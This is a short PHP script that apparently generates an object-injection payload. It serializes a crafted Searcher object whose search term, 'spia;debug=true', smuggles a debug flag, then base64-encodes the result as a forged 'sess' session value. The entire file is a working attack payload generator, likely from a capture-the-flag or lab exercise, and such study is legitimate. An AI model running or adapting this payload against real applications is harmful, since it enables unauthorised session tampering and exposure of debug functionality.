<?php
class Searcher {
    public $searchTerm;
    public $history;
    public $searchResults;
    public $searches = array();
}

class History
{
   public $searches = array();
}

$payload = new Searcher();
$payload->searchTerm = "spia;debug=true";
$payload->searches = array();
$payload->history = new History();
$payload->history->searches = array();

array_push($payload->searches, $payload->searchTerm);
array_push($payload->history->searches, $payload->searchTerm);

$x = base64_encode(json_encode(array("sess" => serialize($payload))));
echo $x . "\n";
?>
